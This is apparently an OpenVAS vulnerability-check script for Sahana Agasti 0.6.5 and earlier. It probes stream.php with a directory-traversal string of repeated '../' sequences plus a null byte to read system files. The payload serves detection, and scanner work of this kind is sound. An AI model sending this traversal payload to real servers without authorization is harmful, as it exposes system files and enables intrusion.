###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sahana_45730.nasl 11798 2018-10-09 16:37:24Z cfischer $
#
# Sahana Agasti Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103038");
  script_version("$Revision: 11798 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-09 18:37:24 +0200 (Tue, 09 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-21 13:34:43 +0100 (Fri, 21 Jan 2011)");
  script_bugtraq_id(45730);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_name("Sahana Agasti Multiple Input Validation Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("sahana_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sahana/detected");

  script_tag(name:"solution", value:"Vendor updates are available. Please contact the vendor for details.");

  script_tag(name:"summary", value:"Sahana Agasti is prone to multiple input-validation vulnerabilities
  because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process,
  which may aid in redirecting users to a potentially malicious site. This may allow the attacker to
  compromise the application and the computer and may aid in phishing attacks. Other attacks are also possible.");

  script_tag(name:"affected", value:"Sahana Agasti versions 0.6.5 and prior are vulnerable.");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45730");
  script_xref(name:"URL", value:"http://www.sahanafoundation.org/Sahana066");
  script_xref(name:"URL", value:"https://launchpad.net/sahana-agasti/");
  script_xref(name:"URL", value:"http://www.sahanafoundation.org/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

CPE = "cpe:/a:sahana:sahana";

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/www/stream.php?mod=", crap(data:"../", length:3*9), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(url:url, port:port);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);